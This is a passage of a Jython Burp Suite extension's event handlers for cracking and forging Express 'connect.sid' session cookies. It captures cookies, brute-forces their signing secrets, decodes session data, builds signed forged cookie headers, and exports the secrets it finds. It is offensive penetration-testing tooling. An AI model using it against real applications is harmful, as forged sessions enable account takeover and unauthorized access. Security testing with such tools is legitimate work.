        self.extender = extender
    def actionPerformed(self, event):
        if self.extender.cracking:
            self.extender.log_result("[!] Already cracking, please wait or cancel")
            return
        rows = self.extender.cookies_table.getSelectedRows()
        if not rows:
            self.extender.log_result("[!] Please select one or more cookies to crack")
            return
        self.extender.start_crack(list(rows))


class CrackAllListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        if self.extender.cracking:
            self.extender.log_result("[!] Already cracking, please wait or cancel")
            return
        with self.extender.cookie_lock:
            count = len(self.extender.captured_cookies)
        if count == 0:
            self.extender.log_result("[!] No cookies captured yet")
            return
        self.extender.start_crack(range(count))


class QuickCheckListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        if self.extender.cracking:
            self.extender.log_result("[!] Already cracking, please wait or cancel")
            return
        rows = self.extender.cookies_table.getSelectedRows()
        if not rows:
            with self.extender.cookie_lock:
                count = len(self.extender.captured_cookies)
            if count == 0:
                self.extender.log_result("[!] No cookies captured yet")
                return
            rows = range(count)
        # Force quick check only (no wordlist)
        self.extender.quick_check_cb.setSelected(True)
        self.extender.start_crack(list(rows), quick_only=True)


class CancelListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender.cancel_requested = True
        self.extender.log_result("[*] Cancel requested, waiting for current attempt to finish...")


class ClearListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        if self.extender.cracking:
            self.extender.log_result("[!] Cannot clear while cracking")
            return
        with self.extender.cookie_lock:
            self.extender.captured_cookies = []
        self.extender.table_model.setRowCount(0)
        self.extender.log_result("[*] Cookie table cleared")


class CopyResultsListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        text = self.extender.results_area.getText()
        if text:
            self.extender.copy_to_clipboard(text)
            self.extender.set_status("Results copied to clipboard")


class ClearResultsListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        self.extender.results_area.setText("")


class TableClickListener(MouseAdapter):
    def __init__(self, extender):
        self.extender = extender
    def mouseClicked(self, event):
        if event.getClickCount() == 2:
            row = self.extender.cookies_table.getSelectedRow()
            if row >= 0:
                with self.extender.cookie_lock:
                    if row < len(self.extender.captured_cookies):
                        url, cookie_value, sid, sig = self.extender.captured_cookies[row]
                        # Switch to decoder tab and decode
                        self.extender.decode_input_field.setText(cookie_value)
                        self.extender.tabs.setSelectedIndex(2)  # Decoder tab
                        self._decode_cookie(cookie_value)
    
    def _decode_cookie(self, cookie_value):
        try:
            sid, sig = parse_connect_sid(cookie_value)
            result = decode_session_data(sid)
            
            output = []
            output.append("=" * 50)
            output.append("SESSION DATA ANALYSIS")
            output.append("=" * 50)
            output.append("")
            output.append("Raw SID: %s" % result["raw"])
            output.append("")
            output.append("Type: %s" % result["type"])
            output.append("")
            
            if result["decoded"]:
                output.append("Decoded:")
                if result["json"]:
                    output.append(json.dumps(result["json"], indent=2))
                else:
                    output.append(str(result["decoded"]))
            
            output.append("")
            output.append("Signature: %s" % sig)
            
            with self.extender.secrets_lock:
                if sig in self.extender.discovered_secrets:
                    output.append("Known Secret: %s" % self.extender.discovered_secrets[sig])
            
            self.extender.decode_output_area.setText("\n".join(output))
        except Exception as e:
            self.extender.decode_output_area.setText("Error decoding: %s" % str(e))


class UseDiscoveredListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        with self.extender.secrets_lock:
            secrets = list(self.extender.discovered_secrets.values())
        if not secrets:
            JOptionPane.showMessageDialog(
                self.extender.main_panel,
                "No secrets discovered yet. Crack some cookies first!",
                "No Secrets",
                JOptionPane.INFORMATION_MESSAGE
            )
            return
        if len(secrets) == 1:
            self.extender.forge_secret_field.setText(secrets[0])
        else:
            secret = JOptionPane.showInputDialog(
                self.extender.main_panel,
                "Select a discovered secret:",
                "Choose Secret",
                JOptionPane.QUESTION_MESSAGE,
                None,
                secrets,
                secrets[0]
            )
            if secret:
                self.extender.forge_secret_field.setText(secret)


class GenerateUUIDListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        import uuid
        self.extender.forge_sid_field.setText(str(uuid.uuid4()))


class ForgeListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        secret = self.extender.forge_secret_field.getText().strip()
        sid = self.extender.forge_sid_field.getText().strip()
        
        if not secret:
            JOptionPane.showMessageDialog(
                self.extender.main_panel,
                "Please enter a secret",
                "Missing Secret",
                JOptionPane.WARNING_MESSAGE
            )
            return
        if not sid:
            JOptionPane.showMessageDialog(
                self.extender.main_panel,
                "Please enter a session ID",
                "Missing SID",
                JOptionPane.WARNING_MESSAGE
            )
            return
        
        # Generate signed cookie
        cookie_value = sign_cookie(sid, secret)
        encoded_value = urllib.quote(cookie_value, safe="")
        full_header = "Cookie: connect.sid=" + encoded_value
        
        self.extender.forge_output_field.setText(cookie_value)
        self.extender.forge_encoded_field.setText(encoded_value)
        self.extender.forge_header_field.setText(full_header)


class CopyForgedListener(ActionListener):
    def __init__(self, extender, field_type):
        self.extender = extender
        self.field_type = field_type
    def actionPerformed(self, event):
        if self.field_type == "raw":
            text = self.extender.forge_output_field.getText()
        elif self.field_type == "encoded":
            text = self.extender.forge_encoded_field.getText()
        else:
            text = self.extender.forge_header_field.getText()
        
        if text:
            self.extender.copy_to_clipboard(text)
            self.extender.set_status("Copied to clipboard")


class DecodeListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        cookie_value = self.extender.decode_input_field.getText().strip()
        if not cookie_value:
            return
        
        try:
            sid, sig = parse_connect_sid(cookie_value)
            result = decode_session_data(sid)
            
            output = []
            output.append("=" * 50)
            output.append("SESSION DATA ANALYSIS")
            output.append("=" * 50)
            output.append("")
            output.append("Raw SID: %s" % result["raw"])
            output.append("")
            output.append("Type: %s" % result["type"])
            output.append("")
            
            if result["decoded"]:
                output.append("Decoded:")
                if result["json"]:
                    output.append(json.dumps(result["json"], indent=2))
                else:
                    output.append(str(result["decoded"]))
            
            output.append("")
            output.append("Signature: %s" % sig)
            
            with self.extender.secrets_lock:
                if sig in self.extender.discovered_secrets:
                    output.append("Known Secret: %s" % self.extender.discovered_secrets[sig])
            
            self.extender.decode_output_area.setText("\n".join(output))
        except Exception as e:
            self.extender.decode_output_area.setText("Error: %s" % str(e))


class ExportCookiesListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        with self.extender.cookie_lock:
            cookies = list(self.extender.captured_cookies)
        
        if not cookies:
            JOptionPane.showMessageDialog(
                self.extender.main_panel,
                "No cookies to export",
                "Export",
                JOptionPane.INFORMATION_MESSAGE
            )
            return
        
        chooser = JFileChooser()
        chooser.setDialogTitle("Export Cookies as JSON")
        chooser.setSelectedFile(File("express_cookies.json"))
        
        if chooser.showSaveDialog(self.extender.main_panel) == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            try:
                export_data = []
                with self.extender.secrets_lock:
                    for url, cookie_value, sid, sig in cookies:
                        entry = {
                            "url": url,
                            "cookie_value": cookie_value,
                            "sid": sid,
                            "signature": sig,
                            "secret": self.extender.discovered_secrets.get(sig, None)
                        }
                        export_data.append(entry)
                
                with open(path, "w") as f:
                    f.write(json.dumps(export_data, indent=2))
                
                self.extender.log_result("[+] Exported %d cookies to %s" % (len(cookies), path))
            except Exception as e:
                JOptionPane.showMessageDialog(
                    self.extender.main_panel,
                    "Export failed: %s" % str(e),
                    "Export Error",
                    JOptionPane.ERROR_MESSAGE
                )


class ExportSecretsListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        with self.extender.secrets_lock:
            secrets = dict(self.extender.discovered_secrets)
        
        if not secrets:
            JOptionPane.showMessageDialog(
                self.extender.main_panel,
                "No secrets discovered yet",
                "Export",
                JOptionPane.INFORMATION_MESSAGE
            )
            return
        
        chooser = JFileChooser()
        chooser.setDialogTitle("Export Discovered Secrets")
        chooser.setSelectedFile(File("express_secrets.txt"))
        
        if chooser.showSaveDialog(self.extender.main_panel) == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            try:
                with open(path, "w") as f:
                    f.write("# Express Session Secrets\n")
                    f.write("# Exported from Burp Suite\n\n")
                    unique_secrets = set(secrets.values())
                    for secret in unique_secrets:
                        f.write(secret + "\n")
                
                self.extender.log_result("[+] Exported %d unique secrets to %s" % (len(unique_secrets), path))
            except Exception as e:
                JOptionPane.showMessageDialog(
                    self.extender.main_panel,
                    "Export failed: %s" % str(e),
                    "Export Error",
                    JOptionPane.ERROR_MESSAGE
                )


class ContextMenuListener(ActionListener):
    def __init__(self, extender, messages):
        self.extender = extender
        self.messages = messages
    def actionPerformed(self, event):
        found = self.extender.extract_cookies_from_messages(self.messages)
        if found > 0:
            self.extender.log_result("[+] Added %d cookie(s) from context menu" % found)
            # Switch to the extension tab
            self.extender.tabs.setSelectedIndex(0)
        else:
            self.extender.log_result("[*] No new connect.sid cookies found in selected messages")
